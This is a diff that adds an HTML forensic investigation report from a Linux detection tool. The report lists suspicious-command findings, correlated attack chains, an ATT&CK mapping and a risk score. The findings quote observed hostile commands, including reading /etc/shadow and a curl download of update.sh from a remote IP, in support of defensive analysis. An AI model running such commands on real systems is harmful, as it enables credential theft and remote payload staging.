+            </tr>
+
+            <tr class="finding-detail">
+                <td></td>
+
+                <td colspan="6">
+                    The command contains a network discovery or connection utility. Observed command: ss -tulpn
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="mono">
+                    SUSPICIOUS-CMD-0003
+                </td>
+
+                <td>
+                    <strong>
+                        Potential Credential or SSH Key Access
+                    </strong>
+
+                    <div class="subtext">
+                        SUSPICIOUS_COMMAND
+                    </div>
+                </td>
+
+                <td>
+                    <span class="severity high">
+                        HIGH
+                    </span>
+                </td>
+
+                <td>
+                    CREDENTIAL_ACCESS
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td class="mono">
+                    2026-10-06 20:08:57.632028
+                </td>
+            </tr>
+
+            <tr class="finding-detail">
+                <td></td>
+
+                <td colspan="6">
+                    The command references credential stores or SSH authentication material. Observed command: cat /etc/shadow
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="mono">
+                    SUSPICIOUS-CMD-0004
+                </td>
+
+                <td>
+                    <strong>
+                        Suspicious File Download Command
+                    </strong>
+
+                    <div class="subtext">
+                        SUSPICIOUS_COMMAND
+                    </div>
+                </td>
+
+                <td>
+                    <span class="severity medium">
+                        MEDIUM
+                    </span>
+                </td>
+
+                <td>
+                    DOWNLOAD
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td class="mono">
+                    2026-10-06 20:08:57.632449
+                </td>
+            </tr>
+
+            <tr class="finding-detail">
+                <td></td>
+
+                <td colspan="6">
+                    A command capable of downloading remote content was executed. Observed command: curl http://203.0.113.88/update.sh -o /tmp/update.sh
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="mono">
+                    PERSISTENCE-0001
+                </td>
+
+                <td>
+                    <strong>
+                        Potential Cron Persistence
+                    </strong>
+
+                    <div class="subtext">
+                        PERSISTENCE_DETECTED
+                    </div>
+                </td>
+
+                <td>
+                    <span class="severity high">
+                        HIGH
+                    </span>
+                </td>
+
+                <td>
+                    CRON
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td class="mono">
+                    2026-10-06 20:08:57.632102
+                </td>
+            </tr>
+
+            <tr class="finding-detail">
+                <td></td>
+
+                <td colspan="6">
+                    The command references cron configuration that can be used to execute commands automatically. Observed command: crontab -e
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="mono">
+                    NETWORK-ACTIVITY-0001
+                </td>
+
+                <td>
+                    <strong>
+                        Network Discovery Activity
+                    </strong>
+
+                    <div class="subtext">
+                        NETWORK_ACTIVITY
+                    </div>
+                </td>
+
+                <td>
+                    <span class="severity medium">
+                        MEDIUM
+                    </span>
+                </td>
+
+                <td>
+                    NETWORK_DISCOVERY
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td class="mono">
+                    2026-10-06 20:08:57.631982
+                </td>
+            </tr>
+
+            <tr class="finding-detail">
+                <td></td>
+
+                <td colspan="6">
+                    The command performs local network configuration or neighbor discovery. Observed command: ip addr
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="mono">
+                    NETWORK-ACTIVITY-0002
+                </td>
+
+                <td>
+                    <strong>
+                        Network Connection Enumeration
+                    </strong>
+
+                    <div class="subtext">
+                        NETWORK_ACTIVITY
+                    </div>
+                </td>
+
+                <td>
+                    <span class="severity medium">
+                        MEDIUM
+                    </span>
+                </td>
+
+                <td>
+                    CONNECTION_ENUMERATION
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td class="mono">
+                    2026-10-06 20:08:57.632003
+                </td>
+            </tr>
+
+            <tr class="finding-detail">
+                <td></td>
+
+                <td colspan="6">
+                    The command enumerates active or listening network connections. Observed command: ss -tulpn
+                </td>
+            </tr>
+            
+            <tr>
+                <td class="mono">
+                    NETWORK-ACTIVITY-0003
+                </td>
+
+                <td>
+                    <strong>
+                        Remote Network Download
+                    </strong>
+
+                    <div class="subtext">
+                        NETWORK_ACTIVITY
+                    </div>
+                </td>
+
+                <td>
+                    <span class="severity medium">
+                        MEDIUM
+                    </span>
+                </td>
+
+                <td>
+                    REMOTE_DOWNLOAD
+                </td>
+
+                <td>
+                    
+                </td>
+
+                <td class="mono">
+                    
+                </td>
+
+                <td class="mono">
+                    2026-10-06 20:08:57.632449
+                </td>
+            </tr>
+
+            <tr class="finding-detail">
+                <td></td>
+
+                <td colspan="6">
+                    The command downloads content from a remote network location. Observed command: curl http://203.0.113.88/update.sh -o /tmp/update.sh
+                </td>
+            </tr>
+            
+        </tbody>
+
+    </table>
+
+</section>
+
+<section class="section">
+
+    <div class="section-header">
+
+        <div>
+
+            <h2>
+                Correlated Attack Chains
+            </h2>
+
+            <p>
+                Related findings grouped into explainable investigation chains.
+            </p>
+
+        </div>
+
+    </div>
+
+    
+            <div class="chain-card">
+
+                <div class="chain-header">
+
+                    <div>
+
+                        <div class="eyebrow">
+                            CHAIN-0001
+                        </div>
+
+                        <h3>
+                            Correlated Linux Attack Chain
+                        </h3>
+
+                    </div>
+
+                    <div class="chain-metrics">
+
+                        <span class="severity critical">
+                            CRITICAL
+                        </span>
+
+                        <span class="confidence">
+                            65% confidence
+                        </span>
+
+                    </div>
+
+                </div>
+
+                <p class="chain-summary">
+                    Reconstructed attack sequence: Privilege Escalation → Credential Access. The activity involved analyst, root and unidentified source(s). 4 finding(s) were correlated. 2 correlation signal(s) support the reconstructed sequence.
+                </p>
+
+                <div class="chain-steps">
+                    
+                <div class="chain-step">
+                    <div class="step-marker">
+                        1
+                    </div>
+
+                    <div class="step-content">
+                        <div class="step-header">
+
+                            <strong>
+                                Potential Privilege Escalation Detected
+                            </strong>
+
+                            <span class="stage-badge">
+                                PRIVILEGE_ESCALATION
+                            </span>
+
+                        </div>
+
+                        <div class="subtext">
+                            2026-10-06 15:32:10
+                        </div>
+
+                        <p>
+                            User analyst executed a command through sudo as root. This represents a privilege transition that requires investigation.
+                        </p>
+
+                    </div>
+                </div>
+                
+                <div class="chain-step">
+                    <div class="step-marker">
+                        2
+                    </div>
+
+                    <div class="step-content">
+                        <div class="step-header">
+
+                            <strong>
+                                Potential Privilege Escalation Detected
+                            </strong>
+
+                            <span class="stage-badge">
+                                PRIVILEGE_ESCALATION
+                            </span>
+
+                        </div>
+
+                        <div class="subtext">
+                            2026-10-06 15:32:15
+                        </div>
+
+                        <p>
+                            User analyst executed a command through sudo as root. This represents a privilege transition that requires investigation.
+                        </p>
+
+                    </div>
+                </div>
+                
+                <div class="chain-step">
+                    <div class="step-marker">
+                        3
+                    </div>
+
+                    <div class="step-content">
+                        <div class="step-header">
+
+                            <strong>
+                                Potential Privilege Escalation Detected
+                            </strong>
+
+                            <span class="stage-badge">
+                                PRIVILEGE_ESCALATION
+                            </span>
+
+                        </div>
+
+                        <div class="subtext">
+                            2026-10-06 15:32:21
+                        </div>
+
+                        <p>
+                            User analyst executed a command through sudo as root. This represents a privilege transition that requires investigation.
+                        </p>
+
+                    </div>
+                </div>
+                
+                <div class="chain-step">
+                    <div class="step-marker">
+                        4
+                    </div>
+
+                    <div class="step-content">
+                        <div class="step-header">
+
+                            <strong>
+                                Potential Credential or SSH Key Access
+                            </strong>
+
+                            <span class="stage-badge">
+                                CREDENTIAL_ACCESS
+                            </span>
+
+                        </div>
+
+                        <div class="subtext">
+                            2026-10-06 15:32:21
+                        </div>
+
+                        <p>
+                            The command references credential stores or SSH authentication material. Observed command: /usr/bin/cat /etc/shadow
+                        </p>
+
+                    </div>
+                </div>
+                
+                </div>
+
+            </div>
+            
+            <div class="chain-card">
+
+                <div class="chain-header">
+
+                    <div>
+
+                        <div class="eyebrow">
+                            CHAIN-0002
+                        </div>
+
+                        <h3>
+                            Correlated Linux Attack Chain
+                        </h3>
+
+                    </div>
+
+                    <div class="chain-metrics">
+
+                        <span class="severity medium">
+                            MEDIUM
+                        </span>
+
+                        <span class="confidence">
+                            53% confidence
+                        </span>
+
+                    </div>
+
+                </div>
+
+                <p class="chain-summary">
+                    Reconstructed attack sequence: Reconnaissance. The activity involved unidentified account(s) and unidentified source(s). 3 finding(s) were correlated. 1 correlation signal(s) support the reconstructed sequence.
+                </p>
+
+                <div class="chain-steps">
+                    
+                <div class="chain-step">
+                    <div class="step-marker">
+                        1
+                    </div>
+
+                    <div class="step-content">
+                        <div class="step-header">
+
+                            <strong>
+                                Network Discovery Activity
+                            </strong>
+
+                            <span class="stage-badge">
+                                RECONNAISSANCE
+                            </span>
+
+                        </div>
+
+                        <div class="subtext">
+                            2026-10-06 20:08:57.631982
+                        </div>
+
+                        <p>
+                            The command performs local network configuration or neighbor discovery. Observed command: ip addr
+                        </p>
+
+                    </div>
+                </div>
+                
+                <div class="chain-step">
+                    <div class="step-marker">
+                        2
+                    </div>
+
+                    <div class="step-content">
+                        <div class="step-header">
+
+                            <strong>
+                                Potential Network Reconnaissance Command
+                            </strong>
+
+                            <span class="stage-badge">
+                                RECONNAISSANCE
+                            </span>
+
+                        </div>
+
+                        <div class="subtext">
+                            2026-10-06 20:08:57.632003
+                        </div>
+
+                        <p>
+                            The command contains a network discovery or connection utility. Observed command: ss -tulpn
+                        </p>
+
+                    </div>
+                </div>
+                
+                <div class="chain-step">
+                    <div class="step-marker">
+                        3
+                    </div>
+
+                    <div class="step-content">
+                        <div class="step-header">
+
+                            <strong>
+                                Network Connection Enumeration
+                            </strong>
+
+                            <span class="stage-badge">
+                                RECONNAISSANCE
+                            </span>
+
+                        </div>
+
+                        <div class="subtext">
+                            2026-10-06 20:08:57.632003
+                        </div>
+
+                        <p>
+                            The command enumerates active or listening network connections. Observed command: ss -tulpn
+                        </p>
+
+                    </div>
+                </div>
+                
+                </div>
+
+            </div>
+            
+            <div class="chain-card">
+
+                <div class="chain-header">
+
+                    <div>
+
+                        <div class="eyebrow">
+                            CHAIN-0003
+                        </div>
+
+                        <h3>
+                            Multi-Stage Linux Attack Chain
+                        </h3>
+
+                    </div>
+
+                    <div class="chain-metrics">
+
+                        <span class="severity high">
+                            HIGH
+                        </span>
+
+                        <span class="confidence">
+                            69% confidence
+                        </span>
+
+                    </div>
+
+                </div>
+
+                <p class="chain-summary">
+                    Reconstructed attack sequence: Credential Access → Persistence → Command &amp; Control. The activity involved unidentified account(s) and unidentified source(s). 4 finding(s) were correlated. 2 correlation signal(s) support the reconstructed sequence.
+                </p>
+
+                <div class="chain-steps">
+                    
+                <div class="chain-step">
+                    <div class="step-marker">
+                        1
+                    </div>
+
+                    <div class="step-content">
+                        <div class="step-header">
+
+                            <strong>
+                                Potential Credential or SSH Key Access
+                            </strong>
+
+                            <span class="stage-badge">
+                                CREDENTIAL_ACCESS
+                            </span>
+
+                        </div>
+
+                        <div class="subtext">
+                            2026-10-06 20:08:57.632028
+                        </div>
+
+                        <p>
+                            The command references credential stores or SSH authentication material. Observed command: cat /etc/shadow
+                        </p>
+
+                    </div>
+                </div>
+                
+                <div class="chain-step">
+                    <div class="step-marker">
+                        2
+                    </div>
+
+                    <div class="step-content">
+                        <div class="step-header">
+
+                            <strong>
+                                Potential Cron Persistence
+                            </strong>
+
+                            <span class="stage-badge">
+                                PERSISTENCE
+                            </span>
+
+                        </div>
+
+                        <div class="subtext">
+                            2026-10-06 20:08:57.632102
+                        </div>
+
+                        <p>
+                            The command references cron configuration that can be used to execute commands automatically. Observed command: crontab -e
+                        </p>
+
+                    </div>
+                </div>
+                
+                <div class="chain-step">
+                    <div class="step-marker">
+                        3
+                    </div>
+
+                    <div class="step-content">
+                        <div class="step-header">
+
+                            <strong>
+                                Suspicious File Download Command
+                            </strong>
+
+                            <span class="stage-badge">
+                                COMMAND_AND_CONTROL
+                            </span>
+
+                        </div>
+
+                        <div class="subtext">
+                            2026-10-06 20:08:57.632449
+                        </div>
+
+                        <p>
+                            A command capable of downloading remote content was executed. Observed command: curl http://203.0.113.88/update.sh -o /tmp/update.sh
+                        </p>
+
+                    </div>
+                </div>
+                
+                <div class="chain-step">
+                    <div class="step-marker">
+                        4
+                    </div>
+
+                    <div class="step-content">
+                        <div class="step-header">
+
+                            <strong>
+                                Remote Network Download
+                            </strong>
+
+                            <span class="stage-badge">
+                                COMMAND_AND_CONTROL
+                            </span>
+
+                        </div>
+
+                        <div class="subtext">
+                            2026-10-06 20:08:57.632449
+                        </div>
+
+                        <p>
+                            The command downloads content from a remote network location. Observed command: curl http://203.0.113.88/update.sh -o /tmp/update.sh
+                        </p>
+
+                    </div>
+                </div>
+                
+                </div>
+
+            </div>
+            
+
+</section>
+
+<section class="section">
+
+    <div class="section-header">
+
+        <div>
+
+            <h2>
+                MITRE ATT&CK Mapping
+            </h2>
+
+            <p>
+                Investigation findings mapped to ATT&CK techniques.
+            </p>
+
+        </div>
+
+    </div>
+
+    <table>
+
+        <thead>
+
+            <tr>
+                <th>Technique</th>
+                <th>Name</th>
+                <th>Tactic</th>
+                <th>Description</th>
+                <th>Finding IDs</th>
+            </tr>
+
+        </thead>
+
+        <tbody>
+            
+            <tr>
+
+                <td>
+                    <span class="technique-id">
+                        T1548.003
+                    </span>
+                </td>
+
+                <td>
+                    <strong>
+                        Sudo and Sudo Caching
+                    </strong>
+                </td>
+
+                <td>
+                    Privilege Escalation
+                </td>
+
+                <td>
+                    Sudo was used to execute a command with higher local privileges.
+                </td>
+
+                <td class="mono">
+                    PRIV-ESC-0001, PRIV-ESC-0002, PRIV-ESC-0003
+                </td>
+
+            </tr>
+            
+            <tr>
+
+                <td>
+                    <span class="technique-id">
+                        T1003
+                    </span>
+                </td>
+
+                <td>
+                    <strong>
+                        OS Credential Dumping
+                    </strong>
+                </td>
+
+                <td>
+                    Credential Access
+                </td>
+
+                <td>
+                    Credential-related system files or artifacts were accessed.
+                </td>
+
+                <td class="mono">
+                    SUSPICIOUS-CMD-0001, SUSPICIOUS-CMD-0003
+                </td>
+
+            </tr>
+            
+            <tr>
+
+                <td>
+                    <span class="technique-id">
+                        T1105
+                    </span>
+                </td>
+
+                <td>
+                    <strong>
+                        Ingress Tool Transfer
+                    </strong>
+                </td>
+
+                <td>
+                    Command and Control
+                </td>
+
+                <td>
+                    Content was retrieved from a remote location.
+                </td>
+
+                <td class="mono">
+                    SUSPICIOUS-CMD-0004, NETWORK-ACTIVITY-0003
+                </td>
+
+            </tr>
+            
+            <tr>
+
+                <td>
+                    <span class="technique-id">
+                        T1053.003
+                    </span>
+                </td>
+
+                <td>
+                    <strong>
+                        Cron
+                    </strong>
+                </td>
+
+                <td>
+                    Persistence
+                </td>
+
+                <td>
+                    Cron-based persistence activity was detected.
+                </td>
+
+                <td class="mono">
+                    PERSISTENCE-0001
+                </td>
+
+            </tr>
+            
+            <tr>
+
+                <td>
+                    <span class="technique-id">
+                        T1016
+                    </span>
+                </td>
+
+                <td>
+                    <strong>
+                        System Network Configuration Discovery
+                    </strong>
+                </td>
+
+                <td>
+                    Discovery
+                </td>
+
+                <td>
+                    Network configuration was inspected.
+                </td>
+
+                <td class="mono">
+                    NETWORK-ACTIVITY-0001
+                </td>
+
+            </tr>
+            
+            <tr>
+
+                <td>
+                    <span class="technique-id">
+                        T1049
+                    </span>
+                </td>
+
+                <td>
+                    <strong>
+                        System Network Connections Discovery
+                    </strong>
+                </td>
+
+                <td>
+                    Discovery
+                </td>
+
+                <td>
+                    Active network connections were enumerated.
+                </td>
+
+                <td class="mono">
+                    NETWORK-ACTIVITY-0002
+                </td>
+
+            </tr>
+            
+        </tbody>
+
+    </table>
+
+</section>
+
+<section class="section">
+
+    <div class="section-header">
+
+        <div>
+
+            <h2>
+                Risk Calculation
+            </h2>
+
+            <p>
+                Factors contributing to the final investigation score.
+            </p>
+
+        </div>
+
+    </div>
+
+    <table>
+
+        <thead>
+
+            <tr>
+                <th>Type</th>
+                <th>Reference</th>
+                <th>Reason</th>
+                <th>Points</th>
+            </tr>
+
+        </thead>
+
+        <tbody>
+            
+        <tr>
+
+            <td>
+                finding
+            </td>
+
+            <td class="mono">
+                PRIV-ESC-0001
+            </td>
+
+            <td>
+                CRITICAL
+            </td>
+
+            <td>
+                +40
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                finding
+            </td>
+
+            <td class="mono">
+                PRIV-ESC-0002
+            </td>
+
+            <td>
+                CRITICAL
+            </td>
+
+            <td>
+                +40
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                finding
+            </td>
+
+            <td class="mono">
+                PRIV-ESC-0003
+            </td>
+
+            <td>
+                CRITICAL
+            </td>
+
+            <td>
+                +40
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                finding
+            </td>
+
+            <td class="mono">
+                SUSPICIOUS-CMD-0001
+            </td>
+
+            <td>
+                HIGH
+            </td>
+
+            <td>
+                +30
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                finding
+            </td>
+
+            <td class="mono">
+                SUSPICIOUS-CMD-0002
+            </td>
+
+            <td>
+                MEDIUM
+            </td>
+
+            <td>
+                +20
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                finding
+            </td>
+
+            <td class="mono">
+                SUSPICIOUS-CMD-0003
+            </td>
+
+            <td>
+                HIGH
+            </td>
+
+            <td>
+                +30
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                finding
+            </td>
+
+            <td class="mono">
+                SUSPICIOUS-CMD-0004
+            </td>
+
+            <td>
+                MEDIUM
+            </td>
+
+            <td>
+                +20
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                finding
+            </td>
+
+            <td class="mono">
+                PERSISTENCE-0001
+            </td>
+
+            <td>
+                HIGH
+            </td>
+
+            <td>
+                +30
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                finding
+            </td>
+
+            <td class="mono">
+                NETWORK-ACTIVITY-0001
+            </td>
+
+            <td>
+                MEDIUM
+            </td>
+
+            <td>
+                +20
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                finding
+            </td>
+
+            <td class="mono">
+                NETWORK-ACTIVITY-0002
+            </td>
+
+            <td>
+                MEDIUM
+            </td>
+
+            <td>
+                +20
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                finding
+            </td>
+
+            <td class="mono">
+                NETWORK-ACTIVITY-0003
+            </td>
+
+            <td>
+                MEDIUM
+            </td>
+
+            <td>
+                +20
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                attack_chain
+            </td>
+
+            <td class="mono">
+                CHAIN-0001
+            </td>
+
+            <td>
+                multi-stage attack chain
+            </td>
+
+            <td>
+                +15
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                attack_chain
+            </td>
+
+            <td class="mono">
+                CHAIN-0002
+            </td>
+
+            <td>
+                multi-stage attack chain
+            </td>
+
+            <td>
+                +15
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                attack_chain
+            </td>
+
+            <td class="mono">
+                CHAIN-0003
+            </td>
+
+            <td>
+                multi-stage attack chain
+            </td>
+
+            <td>
+                +15
+            </td>
+
+        </tr>
+        
+        <tr>
+
+            <td>
+                persistence
+            </td>
+
+            <td class="mono">
+                CHAIN-0003
+            </td>
+
+            <td>
+                persistence
+            </td>
+
+            <td>
+                +10
+            </td>
+
+        </tr>
+        
+        </tbody>
+
+    </table>
+
+</section>
+
+<footer class="footer">
+
+    Linux Digital Detective —
+    Turn scattered Linux evidence into an attack timeline.
+
+</footer>
+
+</div>
+
+</body>
+
+</html>
